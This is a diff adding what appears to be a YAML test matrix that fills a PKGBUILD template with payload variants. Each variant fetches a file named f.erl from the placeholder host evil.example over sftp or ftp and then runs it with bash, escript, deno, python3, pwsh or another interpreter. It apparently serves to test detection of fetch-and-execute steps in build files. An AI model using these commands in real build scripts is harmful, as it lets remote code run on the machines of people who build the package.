@@ -1,0 +1,258 @@
+template: template.PKGBUILD
+cells:
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        bash f.erl
+  id: 001-sftpb-bash
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        sh f.erl
+  id: 002-sftpb-sh
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        escript f.erl
+  id: 003-sftpb-escript
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        fennel f.erl
+  id: 004-sftpb-fennel
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        zx f.erl
+  id: 005-sftpb-zx
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        guile f.erl
+  id: 006-sftpb-guile
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        racket f.erl
+  id: 007-sftpb-racket
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        deno f.erl
+  id: 008-sftpb-deno
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        bun f.erl
+  id: 009-sftpb-bun
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        elixir f.erl
+  id: 010-sftpb-elixir
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        ts-node f.erl
+  id: 011-sftpb-tsnode
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        julia < f.erl
+  id: 012-sftpb-julialt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        Rscript < f.erl
+  id: 013-sftpb-rscriptlt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        pwsh < f.erl
+  id: 014-sftpb-pwshlt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        python3 < f.erl
+  id: 015-sftpb-py3lt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        perl < f.erl
+  id: 016-sftpb-perllt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        node < f.erl
+  id: 017-sftpb-nodelt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        tclsh < f.erl
+  id: 018-sftpb-tclshlt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        php < f.erl
+  id: 019-sftpb-phplt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        ruby < f.erl
+  id: 020-sftpb-rubylt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        lua < f.erl
+  id: 021-sftpb-lualt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        for x in *.erl; do bash "$x"; done
+  id: 024-sftpb-loop
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 025-sftbatch-bash
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 026-sftbatch-escript
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        fennel f.erl
+  id: 027-sftbatch-fennel
+- vars:
+    payload: |2
+        sftp -b batch.txt u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 028-sftbatch-julialt
+- vars:
+    payload: |2
+        sftp -oPort=2222 -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        bash f.erl
+  id: 030-sftport-bash
+- vars:
+    payload: |2
+        sftp -oPort=2222 -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        escript f.erl
+  id: 031-sftport-escript
+- vars:
+    payload: |2
+        sftp -oPort=2222 -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        fennel f.erl
+  id: 032-sftport-fennel
+- vars:
+    payload: |2
+        sftp -oPort=2222 -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<< "get /f.erl"
+        julia < f.erl
+  id: 033-sftport-julialt
+- vars:
+    payload: |2
+        printf "get /f.erl\n" | sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 035-sftpipe-bash
+- vars:
+    payload: |2
+        printf "get /f.erl\n" | sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 036-sftpipe-escript
+- vars:
+    payload: |2
+        printf "get /f.erl\n" | sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        fennel f.erl
+  id: 037-sftpipe-fennel
+- vars:
+    payload: |2
+        printf "get /f.erl\n" | sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 038-sftpipe-julialt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < sftp-cmds.txt
+        bash f.erl
+  id: 040-sftstdin-bash
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < sftp-cmds.txt
+        escript f.erl
+  id: 041-sftstdin-escript
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < sftp-cmds.txt
+        fennel f.erl
+  id: 042-sftstdin-fennel
+- vars:
+    payload: |2
+        sftp -b - u@evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < sftp-cmds.txt
+        julia < f.erl
+  id: 043-sftstdin-julialt
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        bash f.erl
+  id: 045-sfthered-bash
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        escript f.erl
+  id: 046-sfthered-escript
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        fennel f.erl
+  id: 047-sfthered-fennel
+- vars:
+    payload: |2
+        sftp -b - u@evil.example <<< "get /f.erl https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz"
+        julia < f.erl
+  id: 048-sfthered-julialt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        bash f.erl
+  id: 050-ftpeof-bash
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        escript f.erl
+  id: 051-ftpeof-escript
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        fennel f.erl
+  id: 052-ftpeof-fennel
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" <<EOF
+      user u p
+      get f.erl
+      bye
+      EOF
+        julia < f.erl
+  id: 053-ftpeof-julialt
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        bash f.erl
+  id: 055-ftpstdin-bash
+- vars:
+    payload: |2
+        ftp -n evil.example "https://github.com/example/harness-baseline/archive/v1.0.0.tar.gz" < ftp-cmds.txt
+        escript f.erl
+  id: 056-ftpstdin-escript
